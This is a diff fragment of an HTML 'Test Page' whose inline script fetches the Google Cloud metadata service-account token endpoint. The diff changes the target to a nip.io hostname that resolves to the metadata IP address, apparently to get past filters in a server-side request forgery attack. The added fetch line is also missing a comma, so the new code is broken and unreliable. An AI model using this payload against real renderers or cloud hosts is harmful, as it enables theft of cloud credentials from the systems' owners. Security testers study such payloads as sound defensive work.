@@ -3,7 +3,7 @@
 <head>
   <title>Test Page</title>
   <script>
-    fetch("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", {
+    fetch("http://169.254.169.254.nip.io/" {
       headers: { "Metadata-Flavor": "Google" }
     })
     .then(r => r.text())
